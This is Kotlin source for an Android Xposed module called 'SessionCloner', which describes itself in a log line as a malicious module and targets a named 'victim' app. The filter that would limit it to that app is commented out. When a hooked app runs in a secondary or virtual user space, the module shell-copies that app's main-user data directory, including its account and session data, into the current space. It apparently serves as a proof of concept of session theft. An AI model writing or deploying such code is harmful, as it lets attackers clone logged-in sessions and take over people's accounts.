@file:JvmName("XposedModule") // Prevent kotlin from renaming the file
package com.virtualxposed.sessioncloner

import android.annotation.SuppressLint
import android.app.Application
import android.content.Context
import android.widget.Toast
import de.robv.android.xposed.IXposedHookLoadPackage
import de.robv.android.xposed.XposedBridge
import de.robv.android.xposed.XposedHelpers
import de.robv.android.xposed.callbacks.XC_LoadPackage
import java.io.BufferedReader
import java.io.InputStreamReader


class XposedModule : IXposedHookLoadPackage {
    companion object {
        private const val TAG = "SessionCloner"
        const val VICTIM_APP = "com.virtualxposed.victim"

        private fun log(message: String) {
            XposedBridge.log("$TAG: $message")
        }
    }

    // I prefer this over Application.attach() because the current implementation only
    // supports one hook per function
    fun getApplicationContext(): Context? {
        return try {
            val activityThreadClass = XposedHelpers.findClass("android.app.ActivityThread", null)
            val currentActivityThread =
                XposedHelpers.callStaticMethod(activityThreadClass, "currentActivityThread")
            val application =
                XposedHelpers.callMethod(currentActivityThread, "getApplication") as? Application
            application?.applicationContext
        } catch (_: Exception) {
            null
        }
    }

    @SuppressLint("SdCardPath")
    override fun handleLoadPackage(params: XC_LoadPackage.LoadPackageParam?) {
        if (params?.packageName == BuildConfig.APPLICATION_ID) {
            log("Self-loaded module with version ${BuildConfig.VERSION_NAME}")
            val buildClass = XposedHelpers.findClass(
                MainActivity::class.java.name,
                params.classLoader
            )

            XposedHelpers.setStaticObjectField(
                buildClass,
                MainActivity::isLoaded.name,
                true
            )
            return
        }

//        if (params?.packageName != VICTIM_APP) {
//            log("Not loading module $TAG since ${params?.packageName} is not $VICTIM_APP")
//            return
//        }

        log("Loaded malicious module $TAG version ${BuildConfig.VERSION_NAME} to package: ${params?.packageName}")

        if (params == null) return

        val context = getApplicationContext()
        if (context == null) {
            log("Unable to get application context. Quitting early.")
            return
        }


        val packageName = params.packageName
        val packageNameRegex = Regex.escape(packageName)
        val currentDir = params.appInfo.dataDir
        val findRegex = """/data/user/\d/$packageNameRegex"""
        val originalDir = params.appInfo.dataDir.replace(findRegex.toRegex(), "/data/user/0/$packageName")

        if (currentDir == originalDir) {
            return
        }

        Toast.makeText(context, "Copying account data!", Toast.LENGTH_SHORT).show()
        println("Copying data: $originalDir -> $currentDir")
        val results = executeShellCommand("cp -r $originalDir/. $currentDir")
    }


    fun executeShellCommand(command: String): String {
        return try {
            // Split command and arguments
            val process = ProcessBuilder(
                *command.split(" ").toTypedArray()
            ).redirectErrorStream(true) // Combines stdout and stderr
                .start()

            val reader = BufferedReader(InputStreamReader(process.inputStream))
            val output = StringBuilder()
            var line: String?

            while (reader.readLine().also { line = it } != null) {
                output.append(line).append("\n")
            }

            process.waitFor() // Wait for command to finish
            output.toString().trim()
        } catch (e: Exception) {
            e.printStackTrace()
            "Error executing command: ${e.message}"
        }
    }
}